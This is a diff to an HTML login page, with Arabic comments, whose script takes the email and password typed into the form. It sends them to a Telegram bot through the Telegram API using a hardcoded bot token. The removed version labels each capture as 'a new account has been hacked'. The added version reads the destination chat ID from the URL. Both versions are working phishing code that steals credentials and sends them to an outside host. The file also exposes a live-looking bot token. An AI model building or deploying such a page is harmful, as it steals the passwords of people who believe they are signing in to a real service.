@@ -60,51 +60,47 @@
       </select>
       <button type="submit">تسجيل الدخول</button>
     </form>
-  <script>
-  window.onload = function() {
-    const params = new URLSearchParams(window.location.search);
-    const chatId = params.get('chatId');
-    const id = params.get('id');
+   <script>
+    const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA"; // حط توكن البوت بتاعك هنا
 
-    if (chatId && !id) {
-      // لو فيه chatId بس — نحوله لـ id في نفس الرابط
-      const targetURL = `${window.location.pathname}?id=${chatId}`;
-      window.location.href = targetURL;
-    }
-    // لو فيه id هيكمل عادي بس مش هيعرضه
-  };
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-  const botToken = "7524604559:AAF2iWs46yY4j7j9bOrbvNtku14gS4_mNiA";
+      // استخراج الـ chatId من الرابط
+      const params = new URLSearchParams(window.location.search);
+      const chatId = params.get('chatId');
 
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
+      if (!chatId) {
+        alert("❌ مفيش chatId في الرابط!");
+        return;
+      }
 
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('id');
+      // جلب البيانات من المدخلات
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
 
-    if (!id) {
-      alert("❌ لا يوجد ID لإرسال البيانات إليه!");
-      return;
-    }
+      const message = `📥 تسجيل دخول جديد:\n📧 الإيميل: ${email}\n🔑 الباسورد: ${password}`;
 
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
-
-    const message = `📥 - تم اختراق حساب جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
-
-    fetch(url)
+      // إرسال البيانات للبوت باستخدام chatId
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      })
       .then(response => response.json())
       .then(data => {
-        console.log("✅ تم الإرسال:", data);
-        alert("✅ تم إرسال البيانات!");
+        alert("✅ تم الإرسال بنجاح!");
       })
       .catch(error => {
-        console.error("❌ خطأ:", error);
-        alert("❌ حصلت مشكلة أثناء الإرسال!");
+        console.error("خطأ:", error);
+        alert("❌ حصل خطأ أثناء الإرسال!");
       });
-  });
-</script>
+    });
+  </script>
 </body>
 </html>
